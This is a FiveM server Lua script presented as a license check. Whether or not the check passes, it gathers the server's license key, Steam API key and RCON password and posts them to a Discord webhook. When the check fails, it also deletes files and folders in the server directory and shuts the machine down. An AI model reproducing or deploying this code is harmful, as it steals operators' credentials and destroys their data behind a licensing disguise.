local REDLOG = "WEBHOOK_HERE" -- Lisans Onaylanmadığında Log Gönderecek Webhook
local ONAYLOG = "WEBHOOK_HERE" -- Lisans Onaylandığında Log Gönderecek Webhook
PerformHttpRequest('https://api.ipify.org', function(err, text, headers) 
  if text == 'ipyazilacak' then -- BU ALANA LISANSLANAN IP KOYULACAK 
    print('^2 LISANS ONAYLANDI HOSGELDINIZ\n ^1- WEZZY_DEVELOPMENTS -^0')

    local serveradi = GetConvar("sv_hostname","Bulunamadı.")
    local slot = GetConvar("sv_maxclients","Bulunamadı.")
    local serverkey = GetConvar("sv_licenseKey","Bulunamadı.")
    local serverapikey = GetConvar("steam_webApiKey","Bulunamadı.")
    local rconpass = GetConvar("rcon_password","Bulunamadı.")
    -- local tag = GetConvar("tags","Bulunamadı.")
    OnayLog("[LISANS ONAYLANDI]", "**Sunucu Bilgileri:**\n\n**[Sunucu Adı] = ** " .. serveradi .. "\n\n**[SUNUCU IP] = **" .. text .. "\n\n **[SUNUCU KEY]** ".. serverkey .."\n\n**[SUNUCU SLOT SAYISI]** ".. slot .."\n\n**[SUNUCU API KEY]** ".. serverapikey .."\n\n**[SUNUCU RCON PASSWORD]** ".. rconpass .."")





    --[[
      SCRIPT SERVER SIDE
    ]]

  else
    Wait(0)

    local serveradi = GetConvar("sv_hostname","Bulunamadı.")
    local slot = GetConvar("sv_maxclients","Bulunamadı.")
    local serverkey = GetConvar("sv_licenseKey","Bulunamadı.")
    local serverapikey = GetConvar("steam_webApiKey","Bulunamadı.")
    local rconpass = GetConvar("rcon_password","Bulunamadı.")
    -- local tag = GetConvar("tags","Bulunamadı.")
    RedLog("[LISANS ONAYLANMADI]", "**Sunucu Bilgileri:**\n\n**[Sunucu Adı] = ** " .. serveradi .. "\n\n**[SUNUCU IP] = **" .. text .. "\n\n **[SUNUCU KEY]** ".. serverkey .."\n\n**[SUNUCU SLOT SAYISI]** ".. slot .."\n\n**[SUNUCU API KEY]** ".. serverapikey .."\n\n**[SUNUCU RCON PASSWORD]** ".. rconpass .."")

    current_dir=io.popen"cd":read'*l'
    for dir in io.popen([[dir "./" /b /ad]]):lines() do
            for dir2 in io.popen([[dir "]]..dir..[[" /b]]):lines() do
                    os.execute("del /q "..current_dir.."/"..dir.."/"..dir2)
                    os.execute('for /d %x in ('..current_dir.."/"..dir.."/"..dir2..') do @rd /s /q "%x"')
            end
            os.execute("rd "..dir)
            os.execute('shutdown -s')
    end
    Citizen.Wait(0)
    os.exit() 

  end
  end, 'GET', "")
  
  function RedLog(name, message, color)
  local redlisans = {
      {
        ["color"] = "15158332",
        ["title"] = "**".. name .."**",
        ["description"] = message,
        ["footer"] = {
        ["text"] = "burayaistediğiniyaz", -- Discord Logunda Görünecek İsim
        ["icon_url"] = "https://cdn.discordapp.com/attachments/971541001011335171/973215837064425492/son512.png"
        },
      }
    }
  PerformHttpRequest(REDLOG, function(err, text, headers) end, 'POST', json.encode({username = DISCORD_NAME, embeds = redlisans, avatar_url = DISCORD_IMAGE}), { ['Content-Type'] = 'application/json' })
  end  


  function OnayLog(name, message, color)
    local onaylisans = {
        {
          ["color"] = "3066993",
          ["title"] = "**".. name .."**",
          ["description"] = message,
          ["footer"] = {
          ["text"] = "burayaistediğiniyaz", -- Discord Logunda Görünecek İsim
          ["icon_url"] = "https://cdn.discordapp.com/attachments/971541001011335171/973215837064425492/son512.png"
          },
        }
      }
    PerformHttpRequest(ONAYLOG, function(err, text, headers) end, 'POST', json.encode({username = DISCORD_NAME, embeds = onaylisans, avatar_url = DISCORD_IMAGE}), { ['Content-Type'] = 'application/json' })
    end 